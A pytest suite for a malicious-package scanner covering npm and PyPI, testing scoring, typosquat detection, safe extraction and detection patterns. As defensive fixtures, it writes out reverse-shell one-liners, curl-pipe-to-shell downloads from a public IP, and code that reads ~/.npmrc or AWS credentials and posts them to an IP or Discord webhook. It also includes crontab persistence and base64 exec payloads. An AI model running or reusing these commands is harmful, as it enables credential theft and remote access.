"""The engine's logic, tested without any malicious code in the repository.

Rule behaviour on real packages is measured live by the agent itself: every package that a public
advisory (OSV / OpenSSF) later confirms is re-scored, and the recall number is published on the site.
Here we test what can be tested with benign fixtures: scoring, verdicts, the established-package
exemption, the hijack path, typosquat distance, safe extraction and the decoded-layer plumbing.
"""
import base64
import io
import json
import os
import sys
import tarfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent import fetch, rules  # noqa: E402
from agent.rules import File, Finding, Package  # noqa: E402

POPULAR = ["lodash", "express", "requests", "react", "colors", "left-pad", "typescript"]


def npm(name, files=None, scripts=None, age_days=2.0, version_age_h=5.0, downloads=None):
    manifest = {"name": name, "version": "1.0.0", "scripts": scripts or {}}
    fs = [File("package.json", json.dumps(manifest).encode())]
    for p, c in (files or {}).items():
        fs.append(File(p, c if isinstance(c, bytes) else c.encode()))
    return Package("npm", name, "1.0.0", fs, manifest, age_days=age_days, version_age_h=version_age_h, weekly_downloads=downloads)


def pypi(name, files=None, age_days=2.0):
    fs = [File(p, c.encode()) for p, c in (files or {}).items()]
    return Package("pypi", name, "0.1.0", fs, {"name": name}, age_days=age_days, version_age_h=5.0)


# ---------------------------------------------------------------- scoring and verdicts

def test_score_counts_each_rule_once_at_its_strongest():
    fs = [Finding("exfil", 3, "a.js", 1, ""), Finding("exfil", 5, "b.js", 2, ""), Finding("shell", 2, "c.js", 3, "")]
    assert rules.score(fs) == 7


def test_new_package_trips_at_threshold_and_watches_below():
    pkg = npm("brand-new-thing")
    strong = [Finding("install-hook", 3, "package.json", 0, ""), Finding("exfil", 5, "index.js", 1, "")]
    assert rules.verdict(pkg, strong) == "tripped"
    weak = [Finding("install-hook", 3, "package.json", 0, ""), Finding("exfil", 1, "index.js", 1, "")]
    assert rules.verdict(pkg, weak) == "watch"
    assert rules.verdict(pkg, []) == "clean"


def test_established_package_is_never_tripped_by_heuristics_alone():
    old = npm("venerable", age_days=2000, version_age_h=24 * 30, downloads=2_000_000)
    heavy = [Finding("install-hook", 5, "package.json", 0, ""), Finding("exfil", 5, "index.js", 1, "")]
    assert rules.is_established(old)
    assert rules.verdict(old, heavy) == "watch"


def test_established_package_with_a_fresh_version_and_one_strong_signal_trips():
    """the hijack case: a trusted name, a version a few hours old, one unmistakable finding"""
    hijacked = npm("venerable", age_days=2000, version_age_h=3, downloads=2_000_000)
    fs = [Finding("install-hook", 5, "package.json", 0, ""), Finding("exfil", 5, "index.js", 1, "")]
    assert rules.verdict(hijacked, fs) == "tripped"
    only_weak = [Finding("install-hook", 3, "package.json", 0, ""), Finding("exfil", 3, "index.js", 1, ""), Finding("binary", 3, "x", 0, "")]
    assert rules.verdict(hijacked, only_weak) == "watch"


def test_confirmed_wins_over_everything():
    pkg = npm("whatever", age_days=3000, downloads=10_000_000)
    assert rules.verdict(pkg, [], confirmed=True) == "confirmed"


def test_age_alone_makes_a_package_established_when_downloads_are_unknown():
    assert rules.is_established(npm("x", age_days=400, downloads=None))
    assert not rules.is_established(npm("x", age_days=20, downloads=None))
    assert rules.is_established(npm("x", age_days=20, downloads=100_000))


# ---------------------------------------------------------------- the rules on benign input

def test_common_tooling_hooks_barely_count():
    pkg = npm("mytool", scripts={"prepare": "husky", "postinstall": "node-gyp rebuild"})
    f = rules.rule_install_hook(pkg)
    assert all(x.weight <= 1 for x in f)
    assert rules.verdict(pkg, rules.analyze(pkg, POPULAR)) == "clean"


def test_a_plain_postinstall_that_runs_js_is_noted_not_tripped():
    pkg = npm("mytool", scripts={"postinstall": "node install.js"}, files={"install.js": "console.log('hi')\n"})
    v, = [rules.verdict(pkg, rules.analyze(pkg, POPULAR))]
    assert v in ("clean", "watch")


def test_clean_library_is_clean():
    pkg = npm("my-utils", files={"index.js": "module.exports = (a, b) => a + b;\n", "README.md": "# hi\n"})
    assert rules.verdict(pkg, rules.analyze(pkg, POPULAR)) == "clean"


def test_minified_vendor_code_is_not_called_obfuscated():
    long_line = "var a=" + ",".join(f"b{i}" for i in range(3000)) + ";"
    pkg = npm("ui-kit", files={"dist/bundle.min.js": long_line + "\n"})
    assert not [f for f in rules.rule_obfuscation(pkg) if f.weight > 0]


def test_base64_image_data_is_not_code():
    blob = base64.b64encode(os.urandom(600)).decode()
    pkg = npm("icons", files={"icons.js": f"export const png = '{blob}';\n"})
    assert not rules.decoded_layers(pkg)
    assert not [f for f in rules.rule_obfuscation(pkg) if "base64" in f.note]


def test_decoded_layer_is_read_through():
    inner = "console.log(process.env.HOME)"
    blob = base64.b64encode(inner.encode()).decode().ljust(200, "A")   # padded so it clears the blob size
    # a real blob is long; make the inner text long enough on its own instead
    inner = "// " + "x" * 220 + "\n" + "console.log(process.env.HOME)\n"
    blob = base64.b64encode(inner.encode()).decode()
    pkg = npm("wrapped", files={"index.js": f"const s = '{blob}';\n"})
    layers = rules.decoded_layers(pkg)
    assert layers and layers[0].path.startswith("index.js#L1") and "process.env" in layers[0].text


# ---------------------------------------------------------------- typosquat

def test_typosquat_one_keystroke_from_a_popular_name():
    f = rules.rule_typosquat(npm("lodahs"), POPULAR)
    assert f and f[0].rule == "typosquat" and "lodash" in f[0].snippet


def test_typosquat_suffix_tricks():
    assert rules.rule_typosquat(npm("express-js"), POPULAR)
    assert rules.rule_typosquat(npm("node-requests"), POPULAR)


def test_typosquat_ignores_established_and_distinct_names():
    assert not rules.rule_typosquat(npm("lodahs", age_days=900, downloads=1_000_000), POPULAR)
    assert not rules.rule_typosquat(npm("completely-different"), POPULAR)
    assert not rules.rule_typosquat(npm("lodash"), POPULAR)


def test_levenshtein():
    assert rules.levenshtein("lodash", "lodahs") == 1
    assert rules.levenshtein("react", "reacts") == 1
    assert rules.levenshtein("abc", "xyz") == 3
    assert rules.levenshtein("short", "muchlongername") == 4   # capped


# ---------------------------------------------------------------- safe extraction

def _tar(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data, kind in entries:
            info = tarfile.TarInfo(name)
            if kind == "sym":
                info.type = tarfile.SYMTYPE; info.linkname = "/etc/passwd"
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def test_extract_drops_unsafe_paths_and_links():
    data = _tar([
        ("package/index.js", b"ok", "file"),
        ("package/../../escape.js", b"no", "file"),
        ("/abs/path.js", b"no", "file"),
        ("package/link.js", b"", "sym"),
    ])
    files = fetch._strip_root(fetch.extract_tar(data))
    assert [f.path for f in files] == ["index.js"]


def test_extract_caps_file_size():
    big = b"x" * (fetch.MAX_FILE + 10)
    data = _tar([("package/big.js", big, "file"), ("package/small.js", b"ok", "file")])
    files = fetch._strip_root(fetch.extract_tar(data))
    assert [f.path for f in files] == ["small.js"]


def test_garbage_is_skipped_not_crashed():
    import pytest
    with pytest.raises(fetch.SkipPackage):
        fetch.extract_tar(b"this is not a tarball")


# ---------------------------------------------------------------- summary shape

def test_summary_carries_evidence_and_labels():
    pkg = npm("lodahs", scripts={"postinstall": "node install.js"}, files={"install.js": "console.log(1)\n"})
    f = rules.analyze(pkg, POPULAR)
    s = rules.summary(pkg, f)
    assert s["name"] == "lodahs" and s["verdict"] in ("watch", "tripped")
    assert "typosquat" in s["rules"] and all({"rule", "file", "line", "snippet"} <= set(e) for e in s["evidence"])


# ---------------------------------------------------------------- where a line sits matters

def test_tests_docs_and_dot_dirs_are_quiet_but_hooked_files_are_not():
    assert rules._is_aux("tests/test_x.py") and rules._is_aux(".github/workflows/ci.yml") and rules._is_aux("docs/make.bat")
    assert not rules._is_aux("src/x.py") and not rules._is_aux("setup.py")
    pkg = npm("t", scripts={"postinstall": "node tests/setup.js"}, files={"tests/setup.js": "console.log(1)\n", "tests/other.js": "x\n"})
    assert rules.hooked(pkg) == {"tests/setup.js"}
    assert not rules._aux(pkg, "tests/setup.js") and rules._aux(pkg, "tests/other.js")


def test_chmod_and_run_is_noted_lightly_and_ci_files_are_ignored():
    pkg = npm("t", files={"bin/run.sh": "chmod +x ./tool && ./tool\n"})
    f = rules.rule_shell(pkg)
    assert f and f[0].weight == 3
    ci = npm("t", files={".devcontainer/devcontainer.json": json.dumps({"postCreateCommand": "chmod +x ./x.sh && ./x.sh"})})
    assert not rules.rule_shell(ci)


def test_a_scanners_own_pattern_list_is_not_a_command():
    assert rules._pattern_line('    (r"/dev/tcp/", "bash tcp device"),')
    assert rules._pattern_line('RX = re.compile(r"curl .* | sh")')
    assert not rules._pattern_line('subprocess.run(cmd)')


def test_comment_lines_are_skipped():
    assert rules._comment("# .netrc might have more auth") and rules._comment("  // eval(x)") and rules._comment(" * http://1.2.3.4/")
    assert not rules._comment("x = 1  # trailing")


def test_setuptools_namespace_pth_and_build_ext_barely_count():
    pkg = pypi("ns", files={"ns-nspkg.pth": "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('ns',));m = sys.modules.setdefault('ns', types.ModuleType('ns'))\n",
                            "setup.py": "from setuptools import setup\nsetup(cmdclass={'build_ext': BuildExt})\n"})
    f = rules.rule_install_hook(pkg)
    assert f and all(x.weight == 1 for x in f)
    pkg2 = pypi("hooked", files={"setup.py": "from setuptools.command.install import install\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n"})
    assert [x.weight for x in rules.rule_install_hook(pkg2)] == [3]


def test_wasm_base64_is_not_code():
    import base64
    wasm = b"\x00asm\x01\x00\x00\x00" + os.urandom(400) + b"llhttp__on_url http exec"
    blob = base64.b64encode(wasm).decode()
    assert rules._decoded_code(blob) is None
    code = "// " + "x" * 200 + "\nconst r = require('child_process');\n"
    assert rules._decoded_code(base64.b64encode(code.encode()).decode())


# ---------------------------------------------------------------- the npm feed

def test_npm_changes_needs_a_numeric_seq(monkeypatch):
    assert fetch.NpmChanges("12345").since == 12345
    assert fetch.NpmChanges("now").since is None and fetch.NpmChanges(None).since is None

    class R:
        def __init__(self, doc): self.doc = doc
        def raise_for_status(self): pass
        def json(self): return self.doc
    calls = []
    def fake_get(url, **kw):
        calls.append((url, kw.get("params")))
        if url == fetch.NpmChanges.ROOT:
            return R({"update_seq": 1000})
        return R({"results": [{"seq": 1001, "id": "a-pkg"}, {"seq": 1002, "id": "_design/x"}, {"seq": 1003, "id": "gone", "deleted": True}], "last_seq": 1003})
    monkeypatch.setattr(fetch.requests, "get", fake_get)
    f = fetch.NpmChanges()
    assert f.poll() == ["a-pkg"] and f.since == 1003 and f.ok
    assert calls[0][0] == fetch.NpmChanges.ROOT and calls[1][1]["since"] == 1000


def test_npm_changes_reports_a_down_feed(monkeypatch):
    def boom(url, **kw): raise fetch.requests.ConnectionError("no route")
    monkeypatch.setattr(fetch.requests, "get", boom)
    f = fetch.NpmChanges(500)
    assert f.poll() == [] and not f.ok and "no route" in f.last_error


# ---------------------------------------------------------------- what counts as code

def test_docstrings_and_block_comments_are_not_code():
    py = 'def f():\n    """reads ~/.aws/credentials and\n    uploads with curl http://1.2.3.4/x | sh\n    """\n    return 1\nx = """\nos.system("curl http://1.2.3.4/p | sh")\n"""\nexec(x)\n'
    lines = dict(rules._code_lines(py, "m.py"))
    assert 2 not in lines and 3 not in lines and 4 not in lines          # the docstring
    assert 7 in lines and "os.system" in lines[7]                        # an assigned string is kept: exec can read it
    js = 'const a = 1;\n/* eval(atob("x"))\n   more */\nconst b = 2; // eval(y)\n// child_process\n'
    lines = dict(rules._code_lines(js, "m.js"))
    assert list(lines) == [1, 4]


def test_eval_inside_a_string_literal_is_not_eval():
    assert rules._in_string('msg = "example: eval(atob(...)) hides"', 16)
    assert not rules._in_string('eval(atob(x))', 0)
    pkg = npm("scanner", files={"index.js": 'const tip = "never do eval(atob(payload))";\n'})
    assert not rules.rule_obfuscation(pkg)


def test_download_and_run_weight_depends_on_the_host():
    pkg = npm("mytool", files={"a.sh": "x\n"})
    pkg.repository = "https://github.com/me/mytool"
    assert rules._download_weight(pkg, "curl -LsSf https://astral.sh/uv/install.sh | sh")[0] == 1
    assert rules._download_weight(pkg, "curl -fsSL https://get.docker.com | sh")[0] == 1
    assert rules._download_weight(pkg, "curl -sSL https://mytool.dev/install.sh | bash")[0] == 2
    assert rules._download_weight(pkg, "curl http://45.9.148.2/x.sh | bash")[0] == 5
    assert rules._download_weight(pkg, "curl -s https://pastebin.com/raw/abc | sh")[0] == 5
    assert rules._download_weight(pkg, "powershell -enc " + "A" * 60)[0] == 5
    assert rules._download_weight(pkg, 'f"powershell.exe -NoProfile -EncodedCommand {encoded}"')[0] == 3
    assert rules._download_weight(pkg, "curl -s https://some-random-cdn.net/x.sh | sh")[0] == 4


def test_bundles_are_not_obfuscation():
    assert rules._is_minified_vendor("web/assets/App-BU3dzTBu.js", "x")
    assert rules._is_minified_vendor("static/chunks/app-catalog-9f3kd0aa.js", "x")
    assert not rules._is_minified_vendor("lib/handlers.js", "x")
    long_import = "import{a as b,c as d}from'./x';" + ",".join(f"v{i}" for i in range(2500)) + ";\n"
    pkg = pypi("app", files={"app/web/App.py": "x = 1\n", "app/web/App-9f3kd0aa.js": long_import})
    assert not rules.rule_obfuscation(pkg)


def test_three_weak_findings_never_make_a_catch():
    pkg = npm("weak-but-many")
    f = [Finding("exfil", 3, "a.js", 1, ""), Finding("shell", 3, "b.js", 1, ""), Finding("obfuscation", 3, "c.js", 1, "")]
    assert rules.score(f) == 9 and rules.verdict(pkg, f) == "watch"
    f.append(Finding("typosquat", 4, "package.json", 0, ""))
    assert rules.verdict(pkg, f) == "tripped"


def test_scripts_dir_is_aux_but_a_hooked_script_without_extension_is_not():
    pkg = npm("t", scripts={"postinstall": "node scripts/setup"}, files={"scripts/setup.js": "x\n", "scripts/install.sh": "curl http://1.2.3.4/x | sh\n"})
    assert rules.hooked(pkg) == {"scripts/setup.js"}
    assert not rules._aux(pkg, "scripts/setup.js") and rules._aux(pkg, "scripts/install.sh")
    assert not rules.rule_shell(pkg)


def test_summary_carries_the_rules_version():
    s = rules.summary(npm("x"), [])
    assert s["rules_version"] == rules.RULES_VERSION and len(rules.RULES_VERSION) == 10


def test_secret_paths_need_a_read_and_a_catalog_is_not_a_read():
    catalog = pypi("guard", files={"g/floor.py": "DENY = ['.docker/config.json', '.git-credentials', '.netrc', '.npmrc', '.pypirc']\n", "g/net.py": "import requests\nrequests.post('http://45.9.148.2/x')\n"})
    assert not [f for f in rules.rule_exfil(catalog) if f.weight >= 5]
    reader = pypi("taker", files={"t/a.py": "p = os.path.expanduser('~/.npmrc')\ndata = open(p).read()\nrequests.post('http://45.9.148.2/x', data=data)\n"})
    assert [f.weight for f in rules.rule_exfil(reader)][:1] == [5]


def test_a_vault_using_dpapi_is_not_a_browser_stealer():
    vault = pypi("vault", files={"v/vault.py": "def _dpapi(data, protect):\n    return CryptProtectData(data) if protect else CryptUnprotectData(data)\n"})
    assert not rules.rule_wallets(vault)
    assert rules.RX_BROWSER_STEAL.search("Login Data") and rules.RX_DECRYPT.search("CryptUnprotectData")


def test_pipe_to_shell_needs_a_whole_word():
    assert not rules.RX_DOWNLOAD_EXEC.search("iwr|kill|lp|ls|measure|shift|sort")
    assert rules.RX_DOWNLOAD_EXEC.search("curl -s https://x.example/i.sh | sh")


def test_binaries_in_bin_are_not_read_as_text_and_keyword_lists_are_not_commands():
    assert not rules._is_text(b"MZ\x90\x00\x03\x00\x00\x00") and rules._is_text(b"print('hi')\n")
    pkg = npm("t", files={"bin/lib.dll": b"MZ\x00" + bytes(range(256)) * 20})
    assert not rules.rule_obfuscation(pkg)
    assert rules._pattern_line("de|v|vcpkg|vdir|vi|vim|virsh|vmstat|wait|watch|wc|wget|whereis|which|who|whoami|write|xargs|zsh|")
    assert not rules.RX_WEBHOOK.search("pywin.framework.interact.ShowInteractiveWindow()")
    assert rules.RX_WEBHOOK.search("https://abc.interact.sh/x")


def test_scoped_names_are_their_own_namespace():
    assert not rules.rule_typosquat(npm("@thecodecodex/tools"), ["toolz", "tools", "installer"])
    assert not rules.rule_typosquat(npm("@sellable/install"), ["installer"])
    assert rules.rule_typosquat(npm("@typs/node"), ["@types/node"])
    assert rules.rule_typosquat(npm("lodahs"), ["lodash"])


def test_a_scope_is_its_own_domain():
    pkg = npm("@sellable/install")
    assert rules._download_weight(pkg, 'curl -fsSL "https://app.sellable.dev/api/v2/cli/install" | sh')[0] == 2
    assert rules._download_weight(npm("@acme/cli"), "curl -s https://bootstrap.pypa.io/get-pip.py | python")[0] == 1


def test_a_list_of_sensitive_file_names_is_not_a_browser_stealer():
    deny = npm("snap", files={"snapshot.mjs": 'const SENSITIVE = new Set([\n  "cookies",\n  "login data",\n  "local state",\n  "web data",\n]);\n'})
    assert not rules.rule_wallets(deny)
    steal = npm("grab", files={"index.js": "const p = path.join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data/Default/Login Data');\nconst q = path.join(process.env.LOCALAPPDATA, 'Google/Chrome/User Data/Default/Web Data');\n"})
    assert [f.weight for f in rules.rule_wallets(steal)] == [5]


def test_an_install_hint_shown_to_the_user_is_not_download_and_run():
    hint = npm("cli", files={"run.js": '"  macOS / Linux / Git Bash:  curl -fsSL https://cli.example.sh | sh\\n" +\n'})
    assert [f.weight for f in rules.rule_shell(hint)] == [1]
    hint2 = npm("cli", files={"proxy.js": "console.error('  Linux:    curl -L https://github.com/x/y/releases/latest/download/y.sh | sh');\n"})
    assert [f.weight for f in rules.rule_shell(hint2)] == [1]
    real = npm("cli", files={"index.js": "require('child_process').execSync('curl -s https://some-cdn.net/x.sh | sh');\n"})
    assert [f.weight for f in rules.rule_shell(real)] == [4]
    real2 = npm("cli", files={"i.py": "os.system(\"curl http://45.9.148.2/a | sh\")\n"})
    assert [f.weight for f in rules.rule_shell(real2)] == [5]


def test_a_command_array_is_not_a_message():
    arr = npm("cli", files={"index.js": "const cmds = [\n  'curl -s https://some-cdn.net/x.sh | sh',\n];\nfor (const c of cmds) require('child_process').execSync(c);\n"})
    assert [f.weight for f in rules.rule_shell(arr)] == [4]


def test_placeholder_webhooks_and_test_fixtures_do_not_count():
    fixture = pypi("probe", files={"tests/test_x.py": '"slack-webhook": "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX",\n', "src/probe/net.py": "import requests\n"})
    assert not rules.rule_exfil(fixture)
    template = npm("t", files={"index.js": "const url = 'https://discord.com/api/webhooks/123456789/<your-token>';\n"})
    assert not rules.rule_exfil(template)
    live = npm("t", files={"index.js": "fetch('https://discord.com/api/webhooks/1172938475610293847/aB3dEfGhIjKlMnOpQrStUvWxYz0123456789', {method: 'POST', body: data});\n"})
    assert [f.weight for f in rules.rule_exfil(live)] == [4]


def test_a_hint_about_crontab_is_not_persistence():
    hint = pypi("p", files={"p/cli.py": 'import subprocess\nprint("If crontab runs `probe sync`, delete that line (`crontab -e`).")\n'})
    assert not rules.rule_shell(hint)
    real = pypi("p", files={"p/x.py": "import subprocess\nsubprocess.run('(crontab -l; echo \"* * * * * python /tmp/.x.py\") | crontab -', shell=True)\n"})
    assert [f.weight for f in rules.rule_shell(real)] == [3]


def test_reverse_shell_shapes_are_exact():
    rs = rules.RX_REVSHELL
    assert not rs.search("rsync -e -r src dst") and not rs.search("inner = f'/bin/bash -i {script_path}'")
    assert rs.search("nc -e /bin/sh 1.2.3.4 4444") and rs.search("/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    assert rs.search("mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 1234 > /tmp/f") and rs.search("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh")


def test_rc_file_persistence_needs_a_write():
    ps = rules.RX_PERSIST
    assert not ps.search("_RELOAD_ZSH_CMD = 'source ~/.zshrc'") and not ps.search("source ~/.bashrc")
    assert ps.search('echo "export PATH=$PATH:/x" >> ~/.bashrc') and ps.search("open(os.path.expanduser('~/.bashrc'), 'a')")
    assert ps.search("(crontab -l; echo '* * * * * x') | crontab -")


def test_read_and_send_count_fully_only_in_one_file_or_to_a_webhook():
    same = pypi("steal", files={"s/a.py": "d = open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('http://45.9.148.2/up', data=d)\n"})
    assert [f.weight for f in rules.rule_exfil(same)][:1] == [5]
    apart = pypi("cloud", files={"c/creds.py": "p = os.path.expanduser('~/.aws/credentials')\ndata = open(p).read()\n", "c/catalog.py": "ENDPOINT = 'https://api.vendor.xyz/v2/catalog'\n"})
    assert [f.weight for f in rules.rule_exfil(apart)][:1] == [3]
    hook = pypi("steal2", files={"s/read.py": "d = open(os.path.expanduser('~/.npmrc')).read()\n", "s/send.py": "requests.post('https://discord.com/api/webhooks/1172938475610293847/aB3dEfGhIjKlMnOpQrStUvWxYz', json={'c': d})\n"})
    assert [f.weight for f in rules.rule_exfil(hook)][:1] == [5]
    assert not rules.RX_REVSHELL.search('": < /dev/tcp/localhost/{remote_port}" 2>/dev/null')
    assert rules.RX_REVSHELL.search("bash -i >& /dev/tcp/45.9.148.2/4444 0>&1")


# ---------------------------------------------------------------- the classic shapes must still trip
# (benign fixtures: placeholder hosts, nothing functional. the real recall number is measured live against osv.)

def test_classic_npm_stealer_shape_trips():
    pkg = npm("some-new-helper", scripts={"postinstall": "node index.js"},
              files={"index.js": "const fs = require('fs'); const os = require('os'); const https = require('https');\nconst d = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\nhttps.request({host: '45.9.148.2', path: '/c', method: 'POST'}).end(d);\n"})
    f = rules.analyze(pkg, POPULAR)
    assert rules.verdict(pkg, f) == "tripped" and {"install-hook", "exfil"} <= {x.rule for x in f}


def test_classic_pypi_setup_shape_trips():
    pkg = pypi("fresh-utils", files={"setup.py": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass PostInstall(install):\n    def run(self):\n        os.system('curl -s http://45.9.148.2/x.sh | sh')\n        install.run(self)\nsetup(cmdclass={'install': PostInstall})\n"})
    f = rules.analyze(pkg, POPULAR)
    assert rules.verdict(pkg, f) == "tripped" and rules.score(f) >= 8


def test_typosquat_with_a_hook_trips():
    pkg = npm("lodahs", scripts={"postinstall": "node setup.js"}, files={"setup.js": "require('child_process').execSync('curl -s https://some-cdn.net/i.sh | sh');\n"})
    f = rules.analyze(pkg, POPULAR)
    assert rules.verdict(pkg, f) == "tripped"


def test_hijacked_trusted_name_trips_on_a_fresh_version_with_one_strong_line():
    pkg = npm("venerable-lib", scripts={"preinstall": "node preinstall.js"}, age_days=2000, version_age_h=2, downloads=3_000_000,
              files={"preinstall.js": "require('child_process').exec('curl http://45.9.148.2/jsextension -o /tmp/x && chmod +x /tmp/x && /tmp/x');\n"})
    f = rules.analyze(pkg, POPULAR)
    assert rules.is_established(pkg) and rules.verdict(pkg, f) == "tripped"


def test_a_bare_public_ip_next_to_a_connection_is_a_send_but_private_ranges_are_not():
    assert rules.RX_IP_BARE.search("host: '45.9.148.2'") and not rules.RX_IP_BARE.search("host: '192.168.1.5'") and not rules.RX_IP_BARE.search("'10.0.0.3'")
    quiet = npm("t", files={"index.js": "const VERSION = '1.2.3.4';\n"})
    assert not rules.rule_exfil(quiet)


def test_a_json_catalog_never_counts_as_reading_secrets():
    cat = pypi("guard", files={"g/catalog.json": '{"example_command":"cat ~/.docker/config.json","x":1}\n', "g/net.py": "s.connect(('45.9.148.2', 443))\n"})
    assert not [f for f in rules.rule_exfil(cat) if f.weight >= 3]


def test_exec_over_a_runtime_built_blob_is_weaker_than_a_literal_payload():
    runtime = pypi("sandbox", files={"s/jail.py": '"python3", "-u", "-c", "import base64;exec(base64.b64decode(\'%s\'))" % code,\n'})
    assert [f.weight for f in rules.rule_obfuscation(runtime)] == [3]
    literal = pypi("drop", files={"d/__init__.py": "exec(__import__('base64').b64decode('" + "aW1wb3J0IG9z" * 6 + "'))\n"})
    assert [f.weight for f in rules.rule_obfuscation(literal)] == [5]


def test_a_linter_rule_quoting_curl_pipe_bash_is_a_message():
    lint = npm("lint", files={"dist/rules.js": "hit('rl-ref-001', 'no `curl ... | bash` in inline shell snippets', ref.path);\nrule: 'Reference inline shell: no `curl ... | bash` (supply-chain vector)',\n"})
    assert all(f.weight == 1 for f in rules.rule_shell(lint))
